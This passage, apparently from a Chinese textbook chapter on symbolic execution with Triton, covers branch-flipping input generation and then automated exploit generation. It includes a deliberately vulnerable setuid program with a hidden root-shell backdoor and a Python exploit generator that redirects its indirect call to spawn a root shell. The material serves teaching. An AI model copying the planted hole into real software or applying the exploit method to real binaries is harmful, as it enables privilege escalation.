+    		printf("x < 5 && y == 10\n");
+    	else
+    		printf("x < 5 && y != 10\n");
+  	} else {
+    	printf("x >= 5\n");
+  	}
+}
+
+int main(int argc, char *argv[]){
+  	if(argc < 3) {
+    	printf("Usage: %s <x> <y>\n", argv[0]);
+    	return 1;
+  	}
+
+  	branch(strtol(argv[1], NULL, 0), strtol(argv[2], NULL, 0));
+
+  	return 0;
+}
+```
+
+branch程序包含一个名为branch的函数，该函数将x和y两个整数作为输入。branch函数包含基于x值的外层if/else分支和基于y值的嵌套if/else分支。该函数由main调用，其中x和y参数由用户输入提供。
+
+我们首先以参数x=0和y=0运行branch，此时外层分支采用if方向，而嵌套分支采用else方向。然后，我们可以使用code_coverage查找翻转嵌套分支的输入来使程序采用if方向。在此之前，我们先要构建运行code_coverage所需的符号配置文件。
+
+#### 构建符号配置文件
+
+需要一个符号配置文件来使用code_coverage，所以需要知道branch的编译版本使用的寄存器和内存位置。下面展示了branch函数的反汇编代码。我们通过对其进行分析来找出branch使用的寄存器和内存位置。
+
+branch函数的反汇编代码
+
+```assembly
+binary@binary-VirtualBox:~/code/chapter13$ objdump -M intel -d ./branch
+
+00000000004005b6 <branch>:
+  4005b6:	55                   	push   rbp
+  4005b7:	48 89 e5             	mov    rbp,rsp
+  4005ba:	48 83 ec 10          	sub    rsp,0x10
+  4005be:	89 7d fc             	mov    DWORD PTR [rbp-0x4],edi
+  4005c1:	89 75 f8             	mov    DWORD PTR [rbp-0x8],esi
+  4005c4:	83 7d fc 04          	cmp    DWORD PTR [rbp-0x4],0x4
+  4005c8:	7f 1e                	jg     4005e8 <branch+0x32>
+  4005ca:	83 7d f8 0a          	cmp    DWORD PTR [rbp-0x8],0xa
+  4005ce:	75 0c                	jne    4005dc <branch+0x26>
+  4005d0:	bf 04 07 40 00       	mov    edi,0x400704
+  4005d5:	e8 96 fe ff ff       	call   400470 <puts@plt>
+  4005da:	eb 16                	jmp    4005f2 <branch+0x3c>
+  4005dc:	bf 15 07 40 00       	mov    edi,0x400715
+  4005e1:	e8 8a fe ff ff       	call   400470 <puts@plt>
+  4005e6:	eb 0a                	jmp    4005f2 <branch+0x3c>
+  4005e8:	bf 26 07 40 00       	mov    edi,0x400726
+  4005ed:	e8 7e fe ff ff       	call   400470 <puts@plt>
+  4005f2:	c9                   	leave  
+  4005f3:	c3                   	ret    
+```
+
+虚拟机中的Ubuntu使用x64版本的System V应用程序二进制接口，该接口规定了系统的调用约定（calling convention）。在x64系统的System V调用约定中，函数调用的第一个和第二个参数分别存储在rdi和rsi寄存器中。因此程序调用branch函数时，x参数存储在rdi中，y参数存储在rsi中。在branch函数内部，程序将x移至内存位置rbp-0x4处，将y移至rbp-0x8处。然后，branch函数将存储x的第一个内存位置与值4进行比较，之后执行地址0x4005c8处的jg指令，实现外部if/else分支。
+
+jg指令的目标地址0x4005e8指向else分支（x大于等于5），而0x4005ca指向if分支。if分支内部嵌套的if/else分支将使用cmp指令将y的值与10（0xa）进行比较，然后执行jne指令。如果y不等于10（嵌套的else分支）则跳转到0x4005dc，否则跳转到0x4005d0（嵌套的if分支）。
+
+现在我们知道了哪些寄存器包含输入的x和y以及待翻转的嵌套分支的地址0x4005ce，接下来就可以编写符号配置文件了。下面展示了用于测试的配置文件。
+
+branch.map
+
+```assembly
+%rdi=$
+%rdi=0
+%rsi=$
+%rsi=0
+```
+
+配置文件将rdi（代表x）符号化，并为其分配具体值0，对存储y的rsi也做同样处理。由于x和y都被符号化，因此当你为新的输入生成解模型时，约束求解器求解得到x和y的具体值。
+
+#### 生成新输入
+
+符号配置文件为x和y都分配了0值来创建基本输入，code_coverage可以生成与其不同路径覆盖的新输入。当使用这些基本输入运行branch程序时，它会输出消息x<5&&y!=10，如下所示：
+
+```assembly
+binary@binary-VirtualBox:~/code/chapter13$ ./branch 0 0
+x < 5 && y != 10
+```
+
+接下来使用code_coverage生成可以翻转判断y值的嵌套分支的新输入，你可以使用这些新输入再次运行branch，并获得输出x<5&&y==10。下面展示了如何执行此操作。
+
+寻找在0x4005ce处接收可选分支的输入
+
+```assembly
+binary@binary-VirtualBox:~/code/chapter13$ ./code_coverage branch branch.map 0x4005b6 0x4005ce
+evaluating branch 0x4005ce:
+    0x4005ce -> 0x4005dc (taken)
+    0x4005ce -> 0x4005d0 (not taken)
+    computing new input for 0x4005ce -> 0x4005d0
+      SymVar 0 (rdi) = 0x0
+      SymVar 1 (rsi) = 0xa
+```
+
+将branch程序作为输入code_coverage的第一个参数，并输入符号配置文件（branch.map）、branch函数的起始地址0x4005b6（分析的入口点）及待翻转的嵌套分支地址0x4005ce。
+
+当模拟运行到达该分支地址时，code_coverage评估并输出Triton生成的、与该地址相关的PathConstraint对象中的每个分支约束。第一个约束条件是目标地址为0x4005dc的分支方向（嵌套的else分支），由于我们在配置文件中指定了具体的输入值，因此模拟在运行过程中会采用此方向。从code_coverage的输出我们可以看到，模拟运行没有采用目标地址为0x4005d0的分支方向（嵌套的if分支），因此code_coverage尝试求解使得程序采用该分支方向的新的输入。
+
+尽管通常情况下找到新输入所需的约束求解计算可能需要花费一段时间，但示例中的简单约束求解只需几秒即可完成。当约束求解器找到解模型后，code_coverage将其输出到屏幕。如你所见，模型将具体值0分配给rdi（x），将值0xa分配给rsi（y）。
+
+我们使用这些新输入来运行branch程序，看一看新的输入是否导致嵌套分支翻转。
+
+```assembly
+binary@binary-VirtualBox:~/code/chapter13$ ./branch 0 0xa
+x < 5 && y == 10
+```
+
+在使用新输入的情况下，branch程序会输出x<5&&y==10，而不是在上一次运行branch程序时得到的x<5&&y!=10。由code_coverage生成的输入成功翻转了嵌套分支的方向！
+
+## 漏洞利用自动化
+
+接下来看一个需要更复杂的约束求解的示例。学习如何使用Triton自动生成漏洞利用程序的输入，劫持一个间接调用点并将其重定向到指定的地址。
+
+假设你已经知道程序存在一个漏洞，该漏洞可以用来控制调用点的目标地址，但是由于目标地址是程序根据用户输入以一种复杂的方式计算出来的，我们还不知道如何利用它来到达所需要的地址。这种情况在诸如模糊测试过程中可能遇到。
+
+正如之前提到的一样，对试图为程序中的每个间接调用点寻找漏洞利用的暴力模糊测试方法来说，符号执行的计算开销太大。相反，我们可以先使用更传统的方式对程序进行模糊测试，为其提供许多伪随机生成的输入，并使用污点分析来确定这些输入是否会使程序陷入危险状态，如间接调用点。然后就可以使用符号执行仅为污点分析显示可能可控的调用点并生成漏洞利用。这些即为后面的示例的假设情况。
+
+### 包含脆弱调用点的程序
+
+首先，我看一下要攻击的程序及其包含的脆弱调用点。下面是包含脆弱调用点的程序源文件icall.c。Makefile将程序编译成一个名为icall的setuid root二进制文件，其中包含一个可以调用几个处理函数之一的间接调用点。间接调用点调用处理函数的过程类似于Nginx之类的Web服务器使用函数指针为它们接收的数据选择合适的处理程序的过程。
+icall.c
+
+```assembly
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <crypt.h>
+
+void forward(char *hash){
+    int i;
+
+  	printf("forward: ");
+  	for(i = 0; i < 4; i++) {
+    	printf("%02x", hash[i]);
+  	}
+  	printf("\n");
+}
+
+void reverse(char *hash){
+  	int i;
+
+  	printf("reverse: ");
+  	for(i = 3; i >= 0; i--) {
+    	printf("%02x", hash[i]);
+  	}
+  	printf("\n");
+}
+
+void hash(char *src, char *dst){
+  	int i, j;
+
+  	for(i = 0; i < 4; i++) {
+    	dst[i] = 31 + (char)i;
+    	for(j = i; j < strlen(src); j += 4) {
+      		dst[i] ^= src[j] + (char)j;
+      		if(i > 1) dst[i] ^= dst[i-2];
+    	}
+  	}
+  	dst[4] = '\0';
+}
+
+static struct {
+  	void (*functions[2])(char *);
+  	char hash[5];
+} icall;
+
+int main(int argc, char *argv[]){
+  	unsigned i;
+
+  	icall.functions[0] = forward;
+  	icall.functions[1] = reverse;
+
+  	if(argc < 3) {
+    	printf("Usage: %s <index> <string>\n", argv[0]);
+    	return 1;
+  	}
+
+  	if(argc > 3 && !strcmp(crypt(argv[3], "$1$foobar"), "$1$foobar$Zd2XnPvN/dJVOseI5/5Cy1")) {
+    	/* secret admin area */
+    	if(setgid(getegid()))
+    		perror("setgid");
+    	if(setuid(geteuid()))
+    		perror("setuid");
+    	execl("/bin/sh", "/bin/sh", (char*)NULL);
+  	} else {
+    	hash(argv[2], icall.hash);
+    	i = strtoul(argv[1], NULL, 0);
+
+    	printf("Calling %p\n", (void*)icall.functions[i]);
+    	icall.functions[i](icall.hash);
+  	}
+
+  	return 0;
+}
+```
+
+icall程序围绕一个全局结构（也称为icall）运行。这个结构包含一个名为icall.functions的数组，该数组包括两个函数指针和一个char类型的数组icall.hash以存储具有终止字符NULL的4字节散列值。main函数初始化icall.functions中的第一个函数指针，使其指向forward函数；然后初始化第二个函数指针使其指向reverse函数。这两个函数都接收char*类型的散列参数，并分别按正向或反向顺序输出散列字节。
+
+icall程序接收两个命令行参数：整数索引和字符串。索引决定要调用icall.functions中的哪个函数，而字符串作为输入生成散列值，之后将对此进行详细解释。
+
+程序还有隐秘的第三个命令行参数没有显示在使用说明的字符串中。此参数用作提供root权限的Shell的管理区域的密码。icall使用GNU的crypt函数（在crypt.h文件中）计算密码的散列值并检查其是否正确，如果散列值是正确的，那么就允许用户访问root权限的Shell。我们的攻击目标是劫持一个间接调用点，并在不知道密码的情况下将其重定向到这个秘密管理区域。
+
+如果没有提供密码的话，icall调用hash函数，该函数对用户提供的字符串计算一个4字节的散列值，并将该散列值赋给icall.hash。计算散列值后，icall解析索引值，使用它来索引icall.functions数组，间接调用该索引指向的处理程序，并将刚刚计算的散列值作为参数传递过去。之后将在漏洞利用中使用该间接调用。在进行程序诊断时，icall输出将要调用的函数的地址，这为稍后编写漏洞利用程序提供了方便。
+
+通常情况下，程序间接调用forward或reverse函数，并将散列值输出到屏幕上，如下所示：
+
+```assembly
+binary@binary-VirtualBox:~/code/chapter13$ ./icall 1 foo
+Calling 0x400974
+reverse: 22295079
+```
+
+这里，使用1作为函数索引来调用reverse函数，foo作为输入字符串。可以看到间接调用的目标地址是0x400974（即reverse函数的起始地址），以及字符串foo的散列值，被反向输出为0x22295079。
+
+你可能已经注意到间接调用存在漏洞：程序没有验证用户提供的索引是否在icall.functions的范围内，因此，用户可以通过提供一个越界的索引诱使icall程序使用icall.functions数组之外的数据作为间接调用目标！碰巧的是，在内存中icall.hash字段与icall.functions字段相邻，因此用户可以通过提供越界的索引2“欺骗”icall程序使用icall.hash作为间接调用目标，如下所示：
+
+```assembly
+binary@binary-VirtualBox:~/code/chapter13$ ./icall 2 foo
+Calling 0x22295079
+Segmentation fault (core dumped)
+```
+
+请注意，上述被调用的地址与按照小端字节序地址解释的散列值是一致的！由于程序在被调用的地址处没有代码，因此程序崩溃并提示段错误。但是，请注意，用户不仅能控制索引，还可以控制作为散列输入的字符串。我们面临的挑战是要找到一个散列值与秘密管理区域的地址完全相同的字符串，然后“诱骗”程序间接调用将这个散列值作为调用目标，从而将控制流转移到管理区域，实现在不需要知道密码的情况下获得root权限的Shell。
+
+如果要手动利用此漏洞的话，你需要对hash函数使用暴力破解或进行逆向工程，以确定哪个输入字符串提供了所需的散列值。使用符号执行生成漏洞利用的好处是，它可以自动求解hash函数，我们可以简单地将其视为一个黑盒！
+
+### 查找脆弱调用点的地址
+
+自动构建漏洞利用需要两个关键信息：漏洞利用要劫持的脆弱间接调用点的地址和需重定向控制的秘密管理区域的目标地址。下面展示了icall二进制文件中的部分主函数，其中包含这两个地址。
+
+从~/code/chapter13/icall中摘录的部分主函数
+
+```assembly
+binary@binary-VirtualBox:~/code/chapter13$ objdump -M intel -d ./icall
+
+0000000000400abe <main>:
+  400abe:	55                   	push   rbp
+  400abf:	48 89 e5             	mov    rbp,rsp
+  400ac2:	48 83 ec 20          	sub    rsp,0x20
+  400ac6:	89 7d ec             	mov    DWORD PTR [rbp-0x14],edi
+  400ac9:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
+  400acd:	48 c7 05 c8 15 20 00 	mov    QWORD PTR [rip+0x2015c8],0x400916        # 6020a0 <icall>
+  400ad4:	16 09 40 00 
+  400ad8:	48 c7 05 c5 15 20 00 	mov    QWORD PTR [rip+0x2015c5],0x400974        # 6020a8 <icall+0x8>
+  400adf:	74 09 40 00 
+  400ae3:	83 7d ec 02          	cmp    DWORD PTR [rbp-0x14],0x2
+  400ae7:	7f 23                	jg     400b0c <main+0x4e>
+  400ae9:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
+  400aed:	48 8b 00             	mov    rax,QWORD PTR [rax]
+  400af0:	48 89 c6             	mov    rsi,rax
+  400af3:	bf a1 0c 40 00       	mov    edi,0x400ca1
+  400af8:	b8 00 00 00 00       	mov    eax,0x0
+  400afd:	e8 5e fc ff ff       	call   400760 <printf@plt>
+  400b02:	b8 01 00 00 00       	mov    eax,0x1
+  400b07:	e9 ea 00 00 00       	jmp    400bf6 <main+0x138>
+  400b0c:	83 7d ec 03          	cmp    DWORD PTR [rbp-0x14],0x3
+  400b10:	7e 78                	jle    400b8a <main+0xcc>
+  400b12:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
+  400b16:	48 83 c0 18          	add    rax,0x18
+  400b1a:	48 8b 00             	mov    rax,QWORD PTR [rax]
+  400b1d:	be bd 0c 40 00       	mov    esi,0x400cbd
+  400b22:	48 89 c7             	mov    rdi,rax
+  400b25:	e8 56 fc ff ff       	call   400780 <crypt@plt>
+  400b2a:	be c8 0c 40 00       	mov    esi,0x400cc8
+  400b2f:	48 89 c7             	mov    rdi,rax
+  400b32:	e8 69 fc ff ff       	call   4007a0 <strcmp@plt>
+  400b37:	85 c0                	test   eax,eax
+  400b39:	75 4f                	jne    400b8a <main+0xcc>
+  400b3b:	e8 70 fc ff ff       	call   4007b0 <getegid@plt>
+  400b40:	89 c7                	mov    edi,eax
+  400b42:	e8 79 fc ff ff       	call   4007c0 <setgid@plt>
+  400b47:	85 c0                	test   eax,eax
+  400b49:	74 0a                	je     400b55 <main+0x97>
+  400b4b:	bf e9 0c 40 00       	mov    edi,0x400ce9
+  400b50:	e8 7b fc ff ff       	call   4007d0 <perror@plt>
+  400b55:	e8 16 fc ff ff       	call   400770 <geteuid@plt>
+  400b5a:	89 c7                	mov    edi,eax
+  400b5c:	e8 8f fc ff ff       	call   4007f0 <setuid@plt>
+  400b61:	85 c0                	test   eax,eax
+  400b63:	74 0a                	je     400b6f <main+0xb1>
+  400b65:	bf f0 0c 40 00       	mov    edi,0x400cf0
+  400b6a:	e8 61 fc ff ff       	call   4007d0 <perror@plt>
+  400b6f:	ba 00 00 00 00       	mov    edx,0x0
+  400b74:	be f7 0c 40 00       	mov    esi,0x400cf7
+  400b79:	bf f7 0c 40 00       	mov    edi,0x400cf7
+  400b7e:	b8 00 00 00 00       	mov    eax,0x0
+  400b83:	e8 78 fc ff ff       	call   400800 <execl@plt>
+  400b88:	eb 67                	jmp    400bf1 <main+0x133>
+  400b8a:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
+  400b8e:	48 83 c0 10          	add    rax,0x10
+  400b92:	48 8b 00             	mov    rax,QWORD PTR [rax]
+  400b95:	be b0 20 60 00       	mov    esi,0x6020b0
+  400b9a:	48 89 c7             	mov    rdi,rax
+  400b9d:	e8 30 fe ff ff       	call   4009d2 <hash>
+  400ba2:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
+  400ba6:	48 83 c0 08          	add    rax,0x8
+  400baa:	48 8b 00             	mov    rax,QWORD PTR [rax]
+  400bad:	ba 00 00 00 00       	mov    edx,0x0
+  400bb2:	be 00 00 00 00       	mov    esi,0x0
+  400bb7:	48 89 c7             	mov    rdi,rax
+  400bba:	e8 21 fc ff ff       	call   4007e0 <strtoul@plt>
+  400bbf:	89 45 fc             	mov    DWORD PTR [rbp-0x4],eax
+  400bc2:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
+  400bc5:	48 8b 04 c5 a0 20 60 	mov    rax,QWORD PTR [rax*8+0x6020a0]
+  400bcc:	00 
+  400bcd:	48 89 c6             	mov    rsi,rax
+  400bd0:	bf ff 0c 40 00       	mov    edi,0x400cff
+  400bd5:	b8 00 00 00 00       	mov    eax,0x0
+  400bda:	e8 81 fb ff ff       	call   400760 <printf@plt>
+  400bdf:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
+  400be2:	48 8b 04 c5 a0 20 60 	mov    rax,QWORD PTR [rax*8+0x6020a0]
+  400be9:	00 
+  400bea:	bf b0 20 60 00       	mov    edi,0x6020b0
+  400bef:	ff d0                	call   rax
+  400bf1:	b8 00 00 00 00       	mov    eax,0x0
+  400bf6:	c9                   	leave  
+  400bf7:	c3                   	ret    
+  400bf8:	0f 1f 84 00 00 00 00 	nop    DWORD PTR [rax+rax*1+0x0]
+  400bff:	00 
+```
+
+秘密管理区域的代码从地址0x400b3b开始，这就是我们希望重定向控制的地址。你可以调用setgid和setuid函数来声明这是管理区域。在这里icall为Shell提供root权限，并调用execl函数来生成Shell。而要劫持的脆弱间接调用点位于地址0x400bef处。
+
+现在你已经得到了必要的地址，接下来我们通过构建符号执行工具来生成漏洞利用。
+
+### 构建漏洞利用生成器
+
+简而言之，生成漏洞利用的工具混合执行icall程序，它将用户指定的所有命令行参数符号化，其中每个输入的字节都对应一个单独的符号变量。然后，该工具从程序开始一直到hash函数都在跟踪这个符号状态，直到执行到达要利用的间接调用点。此时，漏洞利用生成器调用约束求解器，并询问它是否有对符号变量赋值，使间接调用目标地址（存储在rax中）等于秘密管理区域的地址。如果这样的模型存在的话，漏洞利用生成器将结果输出到屏幕上，然后你就可以使用这些值作为输入来攻击icall程序。
+
+请注意，与前面的示例不同，本示例使用的是Triton的混合执行模式，而不是符号模拟模式。这是因为生成该漏洞利用需要在整个程序中跨多个函数来跟踪符号状态，这在符号模拟模式中不仅不方便而且速度也很慢。此外，混合执行模式易于支持不同长度的输入字符串。
+
+与大多数示例不同，本例采用Python编写，这是因为Triton的混合执行模式只支持Python的API。混合Triton工具是一个传递给特殊Pin工具的Python脚本，该Pin工具提供Triton的混合执行引擎。Triton提供了一个名为triton的包装器脚本，该脚本可以自动处理调用Pin的所有细节，因此只需指定要使用哪个Triton工具和要分析哪个程序。你可以在~/triton/pin-2.14-71313-gcc.4.4.7-linux/source/ tools/Triton/build文件中找到triton包装器脚本，并可以看到一个示例演示了如何在测试自动漏洞利用生成工具时使用它。
+
+#### 设置混合执行
+
+下面显示了漏洞利用生成工具的第一部分—exploit_callsite.py。
+
+exploit_callsite.py
+
+```assembly
+#!/usr/bin/env python2
+## -*- coding: utf-8 -*-
+
+# Assumptions: we've already used taint analysis to determine there's a 
+#              user-controllable indirect call site, now we're using 
+#              symbex to figure out how to control it
+
+import sys
+import triton
+import pintool
+
+taintedCallsite = 0x400bef  # Found in a previous DTA pass
+target          = 0x400b3b  # Target to redirect callsite to
+
+Triton = pintool.getTritonContext()
+
+
+def main():
+    Triton.setArchitecture(triton.ARCH.X86_64)
+    Triton.enableMode(triton.MODE.ALIGNED_MEMORY, True)
+
+    pintool.startAnalysisFromSymbol('main')
+
+    pintool.insertCall(symbolize_inputs, pintool.INSERT_POINT.ROUTINE_ENTRY, 'main')
+    pintool.insertCall(hook_icall, pintool.INSERT_POINT.BEFORE)
+
+    pintool.runProgram()
+
+if __name__ == '__main__':
+    main()
+```
+
+诸如exploit_callsite.py的混合Triton工具必须导入triton和pintool模块，这两个模块分别提供对Triton API和Triton绑定的访问，以便与Pin进行交互。然而，我们很难将命令行参数传递给Triton混合执行引擎，因此硬编码了正在利用的间接调用点（taintedCallsite）和要重定向控制的秘密管理区域（target）的地址。taintedCallsite变量名来自一个假设，即你在之前的污点分析过程中发现了此调用点。除了使用硬编码参数的方法，还可以使用环境变量来传递参数。
+
+混合 Triton 工具在全局Triton上下文中维护符号执行状态，你可以通过调用pintool.getTritonContext函数来访问它。该函数会返回一个TritonContext对象，可以使用该对象访问常见的Triton API函数或者它的一个子集。这里，为便于访问，exploit_callsite.py将对TritonContext对象的引用存储在名为Triton的全局变量中。
+
+exploit_callsite.py的主逻辑从main函数开始，而main函数在脚本启动时被调用。与前面的C++符号模拟工具一样，它首先设置Triton体系结构并启用ALIGNED_MEMORY优化。由于此工具是针对正在使用的二进制文件icall定制的，因此我将其体系结构硬编码为x86-64。
+
+接下来，exploit_callsite.py使用Triton的pintool API设置混合分析的起点。它指定Triton从脆弱的icall程序的main函数开始进行符号分析。这意味着在main函数之前的所有icall初始化代码都没有进行符号分析，而Triton的分析在混合执行到达main函数之后就开始了。
+
+请注意，我们假设程序包含符号信息。如果程序缺少符号信息的话，Triton就不知道main函数的位置。在这种情况下，你必须通过反汇编来人工定位main，并通过调用pintool.startAnalysisFromAddress函数（而不是pintool. start AnalysisFromSymbol）告诉Triton从指定的地址开始分析。
+
+配置好分析起点之后，exploit_callsite.py调用Triton的pintool.insertCall函数注册两个回调函数。pintool.insertCall函数至少接收两个参数：一个回调函数和一个插入点（insert point），然后根据插入点的类型接收零个或多个可选参数。
+
+第一个被安装的回调函数名为symbolize_inputs，使用插入点INSERT_POINT.ROUTINE_ENTRY，这意味着当执行到达给定例程的入口点时，会触发回调函数。你可以在insertCall函数的额外参数中通过名称指定该例程。在symbolize_inputs的示例中，我们将main指定为安装回调的例程，因为symbolize_inputs的目的是对icall程序的main函数的所有用户输入进行符号化。当ROUTINE_ENTRY类型的回调发生时，Triton将当前线程ID作为参数传递给回调函数。
+
+第二个回调函数名为hook_icall，它安装在插入点INSERT_POINT.BEFORE上，意味着程序在执行每条指令之前触发回调函数。hook_icall的工作是检查程序是否执行到脆弱间接调用点，如果是的话，则根据符号分析的结果为该间接调用点生成一个漏洞利用。当回调被触发时，Triton为hook_icall提供一个Instruction参数，该参数表示将要执行的指令的详细信息，以便hook_icall检查它是否是你想要利用的间接调用指令。下面展示了混合模式下回调的Triton插入点。
+
+混合模式下回调的Triton插入点
+
+```assembly
+插入点
+回调时刻
+参数
+回调参数
+AFTER
+指令执行完成后
+指令对象
+BEFORE
+指令执行前
+指令对象
+BEFORE_SYMPROC
+符号计算前
+指令对象
+FINI
+结束运行时
+ROUTINE_ENTRY
+函数入口点
+函数名
+线程ID
+ROUTINE_EXIT
+函数退出
+函数名
+线程ID
+IMAGE_LOAD
+新的映像加载时
+映像路径、基址、大小
+SIGNALS
+信号传递
+线程ID、信号ID
+SYSCALL_ENTRY
+系统调用前
+线程ID、系统调用描述符
+SYSCALL_EXIT
+系统调用后
+线程ID、系统调用描述符
+```
+
+最后，在完成必要的设置之后，exploit_callsite.py调用pintool.runProgram函数开始运行被分析的程序。这样就完成了对icall程序进行常规分析所需的所有设置，但是还没有讨论负责生成实际漏洞利用的代码。接下来我们讨论一下回调处理函数symbolize_inputs和hook_icall，它们分别实现了用户输入符号化和调用点利用。
+
+#### 用户输入符号化
+
+下面展示了symbolize_inputs函数的实现代码，这个处理程序在执行到被分析程序的main函数时被调用。根据上面，symbolize_inputs函数接收一个线程ID参数，因为它是ROUTINE_ENTRY插入点的回调。对于本示例，你不需要知道这个线程ID，可以直接忽略它。如前所述，symbolize_inputs函数将用户提供的所有命令行参数符号化，这样约束求解器稍后便能找出操作这些符号变量来设计漏洞利用的方法。
+
+exploit.callsite.py（续）
+
+```assembly
+def symbolize_inputs(tid):
+    rdi = pintool.getCurrentRegisterValue(Triton.registers.rdi) # argc
+    rsi = pintool.getCurrentRegisterValue(Triton.registers.rsi) # argv
+
+    # for each string in argv
+    while rdi > 1:
+        addr = pintool.getCurrentMemoryValue(rsi + ((rdi-1)*triton.CPUSIZE.QWORD), triton.CPUSIZE.QWORD)
+        # symbolize the current argument string (including the terminating NULL)
+        c = None
+        s = ''
+        while c != 0:
+            c = pintool.getCurrentMemoryValue(addr)
+            s += chr(c)
+            Triton.setConcreteMemoryValue(addr, c)
+            Triton.convertMemoryToSymbolicVariable(triton.MemoryAccess(addr, triton.CPUSIZE.BYTE)).setComment('argv[%d][%d]' % (rdi-1, len(s)-1))
+            addr += 1
+        rdi -= 1
+        print 'Symbolized argument %d: %s' % (rdi, s)
+```
+
+symbolize_inputs函数需要访问被分析程序的参数计数（argc）和参数向量（argv）来对用户输入进行符号化。因为symbolize_inputs函数在main函数启动时被调用，所以它可以通过读取rdi和rsi寄存器来获得argc和argv。根据x86-64 System V ABI，我们知道rdi和rsi寄存器中包含main函数的前两个参数。你可以使用pintool.getCurrentRegisterValue函数在具体执行中读取寄存器的当前值，并将寄存器的ID作为输入参数传递给该函数。
+
+在获得argc和argv之后，symbolize_inputs函数通过将rdi（argc）递减到零来遍历所有参数。在C/C++程序中，argv是一个字符串指针数组。为了从argv参数中获取指针，symbolize_inputs函数调用Triton的pintool. getCurrentMemoryValue函数从被rdi索引的argv条目中读取8字节（triton.CPUSIZE.QWORD），该函数接收地址和大小作为输入，并将读取的指针存储在addr中。
+
+接下来，symbolize_inputs函数依次从addr指向的字符串中读取所有字符，它递增addr直到读取NULL字符为止。它再次调用getCurrenMemoryValue函数读取每个字符，但是这次没有大小参数，因此它默认读取1字节大小。在读取1字节之后，symbolize_inputs函数将该字符设置为Triton全局上下文中该内存地址处的具体值，并将包含用户输入字节的内存地址转换为符号变量，同时给符号变量设置注释，以便之后告诉用户它所对应的argv索引。同样，这与前面的C++示例相似。
+
+当symbolize_inputs函数完成后，用户给出的所有命令行参数将被转换成单独的符号变量（每个输入字节对应一个），并在Triton的全局上下文中被设置为具体状态。接下来我们看一看exploit_callsite.py如何使用求解器来求解这些符号变量，并为漏洞调用点找到漏洞利用。
+
+#### 求解漏洞利用
+
+下面展示了hook_icall函数，它是在每条指令之前调用的回调函数。
+
+exploit_callsite.py（续）
+
+```assembly
+def hook_icall(insn):
+    if insn.isControlFlow() and insn.getAddress() == taintedCallsite:
+        for op in insn.getOperands():
+            if op.getType() == triton.OPERAND.REG:
+                print 'Found tainted indirect call site \'%s\'' % (insn)
+                exploit_icall(insn, op)
+```
+
+对于每条指令，hook_icall函数检查它是否是想要利用的间接调用。它首先验证这是一条控制流指令，并且该指令具有你希望利用的调用点的地址。然后它遍历所有的指令操作数，以查找包含调用点目标地址的寄存器操作数。最后，如果以上所有的检查都有效，hook_icall函数调用exploit_icall函数来求解漏洞利用。下面展示了exploit_icall函数的实现代码。
+
+exploit_icall.py（续）
+
+```assembly
+def exploit_icall(insn, op):
+    regId   = Triton.getSymbolicRegisterId(op)
+    regExpr = Triton.unrollAst(Triton.getAstFromId(regId))
+    ast = Triton.getAstContext()
+
+    exploitExpr = ast.equal(regExpr, ast.bv(target, triton.CPUSIZE.QWORD_BIT))
+    for k, v in Triton.getSymbolicVariables().iteritems():
+        if 'argv' in v.getComment():
+            # Argument characters must be printable
+            argExpr = Triton.getAstFromId(k)
+            argExpr = ast.land([
+                          ast.bvuge(argExpr, ast.bv(32,  triton.CPUSIZE.BYTE_BIT)),
+                          ast.bvule(argExpr, ast.bv(126, triton.CPUSIZE.BYTE_BIT))
+                      ])
+            exploitExpr = ast.land([exploitExpr, argExpr])
+
+    print 'Getting model for %s -> 0x%x' % (insn, target)
+    model = Triton.getModel(exploitExpr)
+    for k, v in model.iteritems():
+        print '%s (%s)' % (v, Triton.getSymbolicVariableFromId(k).getComment())
+```
+
+exploit_icall函数从获取包含间接调用目标地址的寄存器操作数的寄存器ID开始计算脆弱调用点的漏洞利用。然后exploit_icall函数调用Triton. getAstFromId函数来获取包含此寄存器的符号表达式的AST，并调用Triton. unrollAst函数在不需要引用节点的情况下将AST完全展开。
+
+接下来，exploit_icall函数获取一个Triton AstContext对象来为约束求解器构建AST表达式，就如同之前的代码覆盖工具。满足此漏洞利用的基本约束很简单：我们希望找到一个解，以使间接调用目标寄存器的符号表达式与存储在全局变量target中的秘密管理区域的地址相等。
+
+请注意，常量triton.CPUSIZE.QWORD_BIT以位为单位表示机器的四字大小（quad word，8字节），要注意与triton.CPUSIZE.QWORD进行区分，两者以字节为单位时表示相同的大小。这意味着ast.bv(target,triton.CPUSIZE. QWORD_BIT)构建了一个包含秘密管理区域地址的64位长的位向量。
+
+除了目标寄存器表达式的基本约束之外，此漏洞利用还需要对用户输入可能采用的形式进行一些约束。为了增加这些约束，exploit_icall函数遍历所有符号变量，检查它们的注释并判断其是否代表来自argv的用户输入字节。如果是的话，exploit_icall函数就获取该符号变量的AST表达式，并且对其进行约束，使其字节必须是可打印的ASCII字符（≥32且≤126）。然后函数将该约束附加到漏洞利用的整个约束列表中。
+
+最后，exploit_icall函数调用Triton.getModel函数为刚刚构建的约束集求解一个漏洞利用解模型。如果这样的解模型存在的话，函数会将模型输出到屏幕上以便用户可以使用它来攻击icall程序。函数会输出模型中每个变量的Triton ID以及其人类可读格式的注释，该注释指出符号变量对应哪个argv字节。这样，用户可以轻松地将解模型映射回具体的命令行参数。接下来我们尝试为icall程序生成一个漏洞利用，并使用它来获得一个root权限的Shell。
+
+13.5.4　获取root权限的Shell
+
+下面展示了如何在实际中使用exploit_callsite.py为icall程序找到一个漏洞利用。
+
+当输入长度为3时尝试为icall找到一个漏洞利用
+
+```assembly
+binary@binary-VirtualBox:~/triton/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build$ ./triton ~/code/chapter13/exploit_callsite.py ~/code/chapter13/icall 2 AAA
+Symbolized argument 2: AAA
+Symbolized argument 1: 2
+Calling 0x223c625e
+Found tainted indirect call site '0x400bef: call rax'
+Getting model for 0x400bef: call rax -> 0x400b3b
+```
+
